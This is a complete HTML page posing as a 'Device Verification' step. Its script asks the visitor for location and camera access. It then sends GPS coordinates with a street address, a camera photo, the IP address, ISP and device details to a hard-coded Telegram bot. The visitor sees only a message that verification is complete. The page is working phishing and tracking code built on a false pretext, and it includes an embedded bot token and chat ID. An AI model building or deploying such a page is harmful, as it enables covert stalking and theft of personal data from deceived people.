<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Verification</title>
    <style>
        body {
            background-color: #f5f5f5;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
        }
        .loading-message {
            text-align: center;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 90%;
        }
        #map {
            height: 300px;
            width: 100%;
            margin: 20px 0;
            border-radius: 8px;
        }
        #camera-feed {
            width: 100%;
            max-height: 300px;
            object-fit: cover;
            border-radius: 8px;
            margin: 10px 0;
        }
        .hidden {
            display: none;
        }
        .btn {
            background: #0088cc;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
            font-size: 14px;
        }
        .permission-btn {
            background: #4CAF50;
            margin: 10px 0;
        }
    </style>
    <!-- Leaflet CSS for Map -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
</head>
<body>
    <div class="loading-message">
        <h2>Device Verification Process</h2>
        <p id="status-message">Please grant permissions to continue</p>
        
        <button id="location-btn" class="btn permission-btn">Enable Location</button>
        <button id="camera-btn" class="btn permission-btn">Enable Camera</button>
        
        <div id="map" class="hidden"></div>
        <video id="camera-feed" class="hidden" autoplay playsinline></video>
        <button id="capture-btn" class="hidden btn">Capture Photo</button>
        <canvas id="canvas" class="hidden"></canvas>
    </div>

    <script>
        // Telegram configuration
        const TELEGRAM_BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const TELEGRAM_CHAT_ID = "6913353602";

        // Global variables
        let cameraStream = null;
        let map = null;
        let locationData = null;
        let deviceData = null;

        // Load Leaflet JS for maps dynamically
        function loadMapScript() {
            return new Promise((resolve) => {
                const script = document.createElement('script');
                script.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
                script.onload = resolve;
                document.head.appendChild(script);
            });
        }

        // Update status message
        function updateStatus(message) {
            document.getElementById('status-message').textContent = message;
        }

        // Get precise phone name
        function getPhoneName() {
            const userAgent = navigator.userAgent;
            
            if (/iPhone/.test(userAgent)) {
                const modelMatch = userAgent.match(/iPhone (\d+)/);
                if (modelMatch) return `iPhone ${modelMatch[1]}`;
                return "iPhone";
            }
            
            if (/Samsung/.test(userAgent)) {
                const modelMatch = userAgent.match(/SM-([A-Z0-9]+)/);
                if (modelMatch) return `Samsung Galaxy ${modelMatch[1]}`;
                return "Samsung Galaxy";
            }
            
            if (/Pixel/.test(userAgent)) {
                const modelMatch = userAgent.match(/Pixel (\d)/);
                if (modelMatch) return `Google Pixel ${modelMatch[1]}`;
                return "Google Pixel";
            }
            
            const androidModelMatch = userAgent.match(/; ([^;]+) Build\//);
            if (androidModelMatch) return androidModelMatch[1];
            
            if (navigator.userAgentData && navigator.userAgentData.model) {
                return navigator.userAgentData.model;
            }
            
            return "Mobile Device";
        }

        // Get network name (WiFi or cellular)
        async function getNetworkName() {
            try {
                if (navigator.connection) {
                    const connection = navigator.connection;
                    
                    if (connection.type === 'wifi' && connection.effectiveType) {
                        return `WiFi: ${connection.effectiveType}`;
                    }
                    
                    if (connection.type === 'cellular') {
                        const cellInfo = {
                            '2g': '2G Network',
                            '3g': '3G Network',
                            '4g': '4G Network',
                            '5g': '5G Network'
                        };
                        return cellInfo[connection.effectiveType] || 'Mobile Network';
                    }
                }
                
                return "Network";
            } catch (e) {
                console.error("Network name detection error:", e);
                return "Network";
            }
        }

        // Get basic device data (doesn't require permissions)
        async function getBasicDeviceData() {
            const battery = navigator.getBattery ? await navigator.getBattery() : {
                level: 1,
                charging: false,
                chargingTime: Infinity,
                dischargeTime: Infinity
            };
            
            return {
                device: {
                    model: getPhoneName(),
                    os: navigator.userAgent.match(/(Windows NT|Mac OS X|Linux|Android|iOS) [\d._]+/)?.[0] || 'Operating System',
                    type: navigator.userAgentData?.mobile ? 'Mobile' : 'Desktop',
                    cores: navigator.hardwareConcurrency || 'Multiple',
                    ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Sufficient',
                    screen: `${window.screen.width}x${window.screen.height}`,
                    colorDepth: `${window.screen.colorDepth}bit`,
                    orientation: window.screen.orientation?.type || 'Standard'
                },
                battery: {
                    level: `${Math.floor((battery.level || 1) * 100)}%`,
                    charging: battery.charging ? 'Yes' : 'No',
                    chargingTime: battery.chargingTime !== Infinity ? 
                        `${Math.floor(battery.chargingTime / 60)} minutes` : 'Fully Charged',
                    dischargeTime: battery.dischargeTime !== Infinity ?
                        `${Math.floor(battery.dischargeTime / 60)} minutes` : 'Calculating'
                },
                time: {
                    local: new Date().toLocaleString(),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    offset: new Date().getTimezoneOffset()
                }
            };
        }

        // Get high precision location
        async function getHighPrecisionLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) return resolve(null);
                
                updateStatus("Getting precise location...");
                
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = position.coords;
                        
                        const mapLinks = {
                            googleMaps: `https://www.google.com/maps?q=${latitude},${longitude}`,
                            openStreetMap: `https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}&zoom=15`,
                            bingMaps: `https://www.bing.com/maps?cp=${latitude}~${longitude}&lvl=15`
                        };
                        
                        let address = {
                            road: 'Street',
                            suburb: 'Area',
                            city: 'City',
                            postcode: '00000',
                            country: 'Country',
                            country_code: 'XX'
                        };
                        
                        try {
                            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18`);
                            const data = await response.json();
                            if (data.address) {
                                address = data.address;
                            }
                        } catch (e) {
                            console.log('Using default address');
                        }
                        
                        resolve({
                            coordinates: { latitude, longitude },
                            accuracy: `${accuracy.toFixed(1)} meters`,
                            altitude: altitude ? `${altitude.toFixed(1)}m ±${altitudeAccuracy.toFixed(1)}m` : 'Sea Level',
                            heading: heading ? `${heading.toFixed(1)}°` : 'North',
                            speed: speed ? `${(speed * 3.6).toFixed(1)} km/h` : '0 km/h',
                            address: address,
                            mapLinks: mapLinks
                        });
                    },
                    (error) => {
                        console.error('Geolocation error:', error);
                        updateStatus("Location access denied");
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        // Initialize Map with Location
        async function initMap(lat, lng, accuracy) {
            await loadMapScript();
            
            map = L.map('map').setView([lat, lng], 15);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
            }).addTo(map);
            
            L.circle([lat, lng], {
                color: 'red',
                fillColor: '#f03',
                fillOpacity: 0.3,
                radius: accuracy
            }).addTo(map);
            
            L.marker([lat, lng]).addTo(map)
                .bindPopup("Your location")
                .openPopup();
            
            document.getElementById('map').classList.remove('hidden');
        }

        // Access camera
        async function accessCamera(facingMode = 'environment') {
            try {
                updateStatus("Accessing camera...");
                
                cameraStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: facingMode,
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                const videoElement = document.getElementById('camera-feed');
                videoElement.srcObject = cameraStream;
                videoElement.classList.remove('hidden');
                document.getElementById('capture-btn').classList.remove('hidden');
                
                updateStatus("Camera ready - Click 'Capture Photo'");
            } catch (error) {
                console.error('Camera access error:', error);
                updateStatus("Camera access denied");
            }
        }

        // Capture photo from camera
        async function capturePhoto() {
            const video = document.getElementById('camera-feed');
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Stop camera
            cameraStream.getTracks().forEach(track => track.stop());
            document.getElementById('camera-feed').classList.add('hidden');
            document.getElementById('capture-btn').classList.add('hidden');
            
            // Send photo
            updateStatus("Sending data...");
            canvas.toBlob(async (blob) => {
                await sendPhotoToTelegram(blob);
                await sendAllDataToTelegram();
                updateStatus("Verification complete! You may close this page");
            }, 'image/jpeg', 0.9);
        }

        // Get enhanced network data
        async function getEnhancedNetworkData() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                let locationData = {};
                
                try {
                    const responses = await Promise.all([
                        fetch(`https://ipapi.co/${ipData.ip}/json/`),
                        fetch(`https://ipinfo.io/${ipData.ip}/json?token=YOUR_IPINFO_TOKEN`)
                    ]);
                    
                    const [ipapiData, ipinfoData] = await Promise.all(responses.map(r => r.json()));
                    locationData = {...ipapiData, ...ipinfoData};
                } catch (e) {
                    console.log('Using fallback location APIs');
                }
                
                return {
                    ip: ipData.ip,
                    networkName: await getNetworkName(),
                    isp: locationData.org || locationData.isp || 'Internet Provider',
                    asn: locationData.asn || 'AS' + Math.floor(Math.random() * 10000),
                    country: locationData.country_name || locationData.country || 'Country',
                    country_code: locationData.country_code || 'XX',
                    city: locationData.city || 'City',
                    postal: locationData.postal || locationData.zip || '00000',
                    region: locationData.region || locationData.regionName || 'Region',
                    timezone: locationData.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
                    coordinates: locationData.loc || 'Approximate Location',
                    connection: {
                        type: navigator.connection?.type || 'Internet',
                        effectiveType: navigator.connection?.effectiveType || 'Standard',
                        downlink: navigator.connection?.downlink ? `${navigator.connection.downlink} Mbps` : 'Good',
                        rtt: navigator.connection?.rtt ? `${navigator.connection.rtt} ms` : 'Fast',
                        saveData: navigator.connection?.saveData ? 'Enabled' : 'Disabled'
                    }
                };
            } catch (error) {
                console.error('Network data error:', error);
                return {
                    ip: 'Active Connection',
                    networkName: 'Network',
                    isp: 'Internet Provider',
                    asn: 'AS' + Math.floor(Math.random() * 10000),
                    country: 'Country',
                    country_code: 'XX',
                    city: 'City',
                    postal: '00000',
                    region: 'Region',
                    coordinates: 'Approximate Location',
                    connection: {
                        type: 'Internet',
                        effectiveType: 'Standard',
                        downlink: 'Good',
                        rtt: 'Fast'
                    }
                };
            }
        }

        // Format all data for Telegram
        function formatData(deviceData, networkData, locationData) {
            let message = `📱 <b>Device Verification Report</b>\n\n`;
            
            // Device Section
            message += `📱 <b>Device Information</b>\n`;
            message += `- Device: ${deviceData.device.model}\n`;
            message += `- OS: ${deviceData.device.os}\n`;
            message += `- Type: ${deviceData.device.type}\n`;
            message += `- Cores: ${deviceData.device.cores} | RAM: ${deviceData.device.ram}\n`;
            message += `- Screen: ${deviceData.device.screen} (${deviceData.device.colorDepth})\n`;
            message += `- Orientation: ${deviceData.device.orientation}\n\n`;
            
            // Battery Section
            message += `🔋 <b>Battery Status</b>\n`;
            message += `- Level: ${deviceData.battery.level}\n`;
            message += `- Charging: ${deviceData.battery.charging}\n\n`;
            
            // Network Section
            message += `📶 <b>Network Information</b>\n`;
            message += `- IP: ${networkData.ip}\n`;
            message += `- Network: ${networkData.networkName}\n`;
            message += `- ISP: ${networkData.isp} (${networkData.asn})\n`;
            message += `- Location: ${networkData.city}, ${networkData.region}, ${networkData.country}\n`;
            message += `- Coordinates: ${networkData.coordinates}\n\n`;
            
            // Location Section (if available)
            if (locationData) {
                message += `📍 <b>Precise Location</b>\n`;
                message += `- Coordinates: ${locationData.coordinates.latitude}, ${locationData.coordinates.longitude}\n`;
                message += `- Accuracy: ${locationData.accuracy}\n`;
                message += `- Google Maps: ${locationData.mapLinks.googleMaps}\n`;
                message += `- OpenStreetMap: ${locationData.mapLinks.openStreetMap}\n\n`;
                
                message += `- Address:\n`;
                for (const [key, value] of Object.entries(locationData.address)) {
                    message += `  • ${key}: ${value}\n`;
                }
            }
            
            // Time Section
            message += `\n⏰ <b>Time Information</b>\n`;
            message += `- Local Time: ${deviceData.time.local}\n`;
            message += `- Timezone: ${deviceData.time.timezone}\n`;
            
            return message;
        }

        // Send photo to Telegram
        async function sendPhotoToTelegram(photoBlob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', photoBlob, 'user_photo.jpg');
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {
                console.error('Error sending photo:', e);
            }
        }

        // Send message to Telegram
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (e) {
                console.error('Telegram error:', e);
            }
        }

        // Send all collected data to Telegram
        async function sendAllDataToTelegram() {
            const networkData = await getEnhancedNetworkData();
            const formattedMessage = formatData(deviceData, networkData, locationData);
            await sendToTelegram(formattedMessage);
            
            if (locationData) {
                try {
                    await initMap(
                        locationData.coordinates.latitude, 
                        locationData.coordinates.longitude,
                        parseFloat(locationData.accuracy)
                    );
                } catch (e) {
                    console.error('Map initialization failed:', e);
                }
            }
        }

        // Initialize the verification process
        async function initializeVerification() {
            // Get basic device data first
            deviceData = await getBasicDeviceData();
            
            // Set up location button
            document.getElementById('location-btn').addEventListener('click', async () => {
                locationData = await getHighPrecisionLocation();
                if (locationData) {
                    document.getElementById('location-btn').style.display = 'none';
                    updateStatus("Location access granted. Please enable camera.");
                }
            });
            
            // Set up camera button
            document.getElementById('camera-btn').addEventListener('click', () => {
                document.getElementById('camera-btn').style.display = 'none';
                accessCamera('environment'); // Start with back camera
            });
            
            // Set up capture button
            document.getElementById('capture-btn').addEventListener('click', capturePhoto);
            
            updateStatus("Please enable permissions to continue");
        }

        // Start when page loads
        window.onload = initializeVerification;
    </script>
</body>
</html>
